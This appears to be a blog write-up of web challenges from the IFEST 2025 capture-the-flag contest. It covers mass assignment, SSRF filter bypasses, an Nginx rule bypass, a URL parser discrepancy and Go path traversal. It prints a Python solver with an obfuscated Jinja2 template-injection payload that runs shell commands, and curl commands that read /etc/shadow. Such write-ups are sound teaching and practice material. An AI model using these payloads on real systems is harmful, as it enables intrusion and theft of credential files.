@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>IFEST 2025 CTF Writeup | Tanknight Site</title>
+  <meta name="keywords" content=" mass-assignment , ssrf , nginx-misconfig , ssti , command-injection , parser-discrepancies , path-traversal ">
+  <meta name="description" content="IFEST 2025 CTF Writeup | Tanknight Site">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://tanknight7.github.io/about/index.html">
+<meta property="og:site_name" content="Tanknight Site">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-07-13T13:36:19.000Z">
+<meta property="article:modified_time" content="2026-07-13T13:36:19.563Z">
+<meta property="article:author" content="tanknight">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 8.1.2">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Tanknight Site" type="application/atom+xml">
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>tanknight</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/TanKnight7"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="linkedin"
+               href="https://www.linkedin.com/in/michael-stevanus-tanoto/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-linkedin"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(1)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                
+    <li>
+        <div data-rel="writeups">
+            
+            writeups
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="1">
+<input type="hidden" id="yelog_site_word_count" value="888">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="return"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
+            <i class="iconfont icon-tag" data-title="label"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">outline</div>
+            <i class="iconfont icon-list" data-title="switch to article list"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>command-injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>mass-assignment</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>nginx-misconfig</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>parser-discrepancies</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>path-traversal</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All writeups "
+           href="/2026/07/13/IFEST-2025-CTF-Writeup/"
+           data-tag="mass-assignment,ssrf,nginx-misconfig,ssti,command-injection,parser-discrepancies,path-traversal"
+           data-author="" >
+            <span class="post-title" title="IFEST 2025 CTF Writeup">IFEST 2025 CTF Writeup</span>
+            <span class="post-date" title="2026-07-13 22:01:00">2026/07/13</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-IFEST-2025-CTF-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">IFEST 2025 CTF Writeup</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="writeups">writeups</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">mass-assignment</a>
+            
+            <a class="color5">ssrf</a>
+            
+            <a class="color1">nginx-misconfig</a>
+            
+            <a class="color5">ssti</a>
+            
+            <a class="color3">command-injection</a>
+            
+            <a class="color1">parser-discrepancies</a>
+            
+            <a class="color5">path-traversal</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2026-07-13 23:29:49'>2026-07-13 22:01</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:888</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Qualification"><span class="toc-text">Qualification</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-V1"><span class="toc-text">Web V1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Orbiter"><span class="toc-text">Orbiter</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Final"><span class="toc-text">Final</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-V2"><span class="toc-text">Web V2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PixelPlaza2"><span class="toc-text">PixelPlaza2</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Qualification"><a href="#Qualification" class="headerlink" title="Qualification"></a>Qualification</h1><h2 id="Web-V1"><a href="#Web-V1" class="headerlink" title="Web V1"></a>Web V1</h2><p>The Python code accepts user input through multiple parameters and creates a new user account based on those parameters. The <code>User</code> class contains an <code>is_admin</code> attribute. By simply adding the parameter <code>is_admin=1</code>, we can register an account with administrator privileges.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup.png"></p>
+<p>Register a new account and add the parameter <code>is_admin=1</code>.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-1.png"></p>
+<p>The <code>/admin/fetch</code> endpoint is vulnerable to SSRF because its whitelist validation is insecure. The application only checks whether the string <code>daffainfo.com</code> exists anywhere in the submitted URL. We can abuse this by placing <code>daffainfo.com</code> inside the query string, allowing a URL like <code>http://127.0.0.1:1337/internal?daffainfo.com</code> to bypass the validation and access the internal service.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-2.png"></p>
+<p>We can simply send a request to the <code>/admin/fetch</code> endpoint using the following URL parameter:</p>
+<p><code>http://127.0.0.1:1337/internal?daffainfo.com</code></p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-4.png"></p>
+<hr>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>The <code>title</code> parameter is first checked against a blacklist. If it passes, it is passed directly into the <code>render_template_string()</code> function.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-5.png"></p>
+<p>One common SSTI proof of concept is <code>{{7*7}}</code>, which gets evaluated as <code>49</code>. However, the application blocks both <code>{{</code> and <code>}}</code>.</p>
+<p>Fortunately, Jinja2 provides another syntax that works just as well:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if 7*7==49 %}49{% endif %}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Now the goal is to bypass the blacklist and achieve RCE. I found a useful resource for building Jinja2 SSTI payloads:</p>
+<p><a target="_blank" rel="noopener" href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p>
+<p>Next, I wrote the following solver:</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># Cat flag and save it to static/testing12312</span></span><br><span class="line">    payload = <span class="string">r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('cat reward/fl\x2a &gt;&gt; static/testing12312') %} a {%endif%}"""</span></span><br><span class="line">    trigger_ssti(url, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag</span></span><br><span class="line">    res = requests.get(<span class="string">f"<span class="subst">{url}</span>/static/testing12312"</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Delete the file to avoid unintended access by other participants</span></span><br><span class="line">    payload = <span class="string">r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('rm static/testing12312') %} a {%endif%}"""</span></span><br><span class="line">    trigger_ssti(url, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_ssti</span>(<span class="params">url, payload</span>):</span><br><span class="line">    url = <span class="string">f"<span class="subst">{url}</span>/?title=<span class="subst">{quote(payload)}</span>"</span></span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    res = BeautifulSoup(res.text,<span class="string">'html.parser'</span>).find(<span class="string">'h1'</span>, class_=<span class="string">'display-4 fst-italic'</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://103.163.139.198:8888"</span></span><br><span class="line">    solver(url)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/../images/IFEST-2025-CTF-Writeup-6.png"></p>
+<hr>
+<h2 id="Orbiter"><a href="#Orbiter" class="headerlink" title="Orbiter"></a>Orbiter</h2><p>The challenge exposed a <code>phpinfo.php</code> file that leaked the credentials required to log in. The password turned out to be the first part of the flag.</p>
+<p>After logging in, I found a JWT cookie containing the second part of the flag. Finally, one of the authenticated endpoints was vulnerable to command injection, allowing RCE and revealing the third part of the flag.</p>
+<p>First, I performed directory fuzzing and discovered <code>/phpinfo.php</code>.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-7.png"></p>
+<p>The page exposed the login credentials as well as the first part of the flag.</p>
+<p><strong>Username:</strong> Armstrong</p>
+<p><strong>Password:</strong> 345Y_P34SY</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-8.png"></p>
+<p>Flag Part 1: <code>345Y_P34SY</code></p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-9.png"></p>
+<p>The JWT cookie contained the second part of the flag.</p>
+<p>Flag Part 2: <code>_L3M0N_</code></p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-10.png"></p>
+<p>The authenticated endpoint was vulnerable to command injection. Reading <code>true_flag.txt</code> revealed the final part of the flag.</p>
+<p>Flag Part 3: <code>5QU332Y</code></p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-11.png"></p>
+<p>Final flag:</p>
+<p><code>IFEST13{345Y_P34SY_L3M0N_5QU332Y!!!}</code></p>
+<h1 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h1><h2 id="Web-V2"><a href="#Web-V2" class="headerlink" title="Web V2"></a>Web V2</h2><p>The code below is vulnerable because of <code>User(**data)</code>. Since user-controlled parameters are unpacked directly into the constructor, an attacker can provide <code>is_admin=1</code> and register as an administrator.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-12.png"></p>
+<p>Successfully registered as an admin.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-13.png"></p>
+<p>The next step was to access <code>/admin/fetch</code> and exploit the SSRF vulnerability. However, the Nginx configuration blocked requests to that endpoint.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-14.png"></p>
+<p>Based on the following research:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.1nf1n1ty.team/hacktricks/pentesting-web/proxy-waf-protections-bypass">https://blog.1nf1n1ty.team/hacktricks/pentesting-web/proxy-waf-protections-bypass</a></p>
+<p>the Nginx configuration is vulnerable because the protection rules can be bypassed by appending certain special characters to the request.</p>
+<p>Since the server runs <strong>Nginx 1.22.0</strong> with a <strong>Flask</strong> backend, the bypass characters are <code>\x85</code> or <code>\xA0</code>.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-15.png"></p>
+<p>I simply intercepted the request in Burp Suite and inserted <code>\x85</code> after <code>/admin/fetch</code>.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-16.png"></p>
+<p>This successfully bypassed the Nginx rule.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-17.png"></p>
+<p>When attempting to perform SSRF against <code>/internal</code>, another protection was in place. The supplied URL was parsed with <code>urlparse()</code>, and the hostname was validated.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-18.png"></p>
+<p>This validation can be bypassed by appending <code>\@daffainfo.com</code>. The <code>urlparse()</code> function interprets <code>daffainfo.com</code> as the hostname.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-19.png"></p>
+<p>However, the backend later passes the URL to <code>requests.get()</code>, which treats <code>\@daffainfo.com</code> as part of the URL path instead.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-20.png"></p>
+<p>To remove the unwanted <code>/%5C@daffainfo.com</code> path segment, I simply used path traversal.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-21.png"></p>
+<p>The exploit worked, and I solved the challenge 😀</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-22.png"></p>
+<p>Flag:</p>
+<p><code>IFEST13{a0526f70f53e2aa1d395ac02b7653498}</code></p>
+<hr>
+<h2 id="PixelPlaza2"><a href="#PixelPlaza2" class="headerlink" title="PixelPlaza2"></a>PixelPlaza2</h2><p>The <code>staticHandler</code> function is vulnerable to path traversal.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-23.png"></p>
+<p>Why does this happen?</p>
+<p>Normally, Go automatically normalizes URL paths. However, when the HTTP method is <code>CONNECT</code>, Go skips the normalization step, making path traversal possible.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-24.png"></p>
+<p>Using the following command:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://103.163.139.198:8888/../../../etc/shadow"</span> -X CONNECT --path-as-is</span><br></pre></td></tr></tbody></table></figure>
+
+<p>I was able to read the contents of <code>/etc/shadow</code>.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-25.png"></p>
+<p>While browsing <code>/about.html</code>, I noticed a link pointing to <code>/docs/text</code>, but the file didn’t exist.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-26.png"></p>
+<p>After some investigation, I found that the <code>docs</code> directory was actually located one level above the current directory.</p>
+<p><img src="/../images/IFEST-2025-CTF-Writeup-27.png"></p>
+<p>Using path traversal again, I retrieved the flag with:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://103.163.139.198:8888/../docs/text"</span> -X CONNECT --path-as-is</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/../images/IFEST-2025-CTF-Writeup-28.png"></p>
+<p>Flag:</p>
+<p><code>IFEST13{g0L4nG_5UpP0rt5_p4th_Tr4V3rs4L_w1tH_CONNECT}</code></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> Please cite the source when reposting. Readers are welcome to verify the references cited in the article and point out any errors or unclear expressions. </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <script>
+        {
+            const comments = document.getElementById("comments");
+            const script = document.createElement("script");
+            script.src = "https://giscus.app/client.js";
+            script.setAttribute('data-repo', "TanKnight7/TanKnight7.github.io");
+            script.setAttribute('data-repo-id', "R_kgDOOxOm1A");
+            script.setAttribute('data-category', "General");
+            script.setAttribute('data-category-id', "DIC_kwDOOxOm1M4DBH1f");
+            script.setAttribute('data-mapping', "pathname");
+            script.setAttribute('data-strict', "0");
+            script.setAttribute('data-reactions-enabled', "1");
+            script.setAttribute('data-emit-metadata', "1");
+            script.setAttribute('data-input-position', "top");
+            script.setAttribute('data-theme', "light");
+            script.setAttribute('data-lang', "en");
+            script.setAttribute('data-loading', "lazy");
+            script.setAttribute('crossorigin', "anonymous");
+            script.setAttribute('async', "");
+            comments.appendChild(script);
+        }
+    </script>
+</div>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2026 Tanknight
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
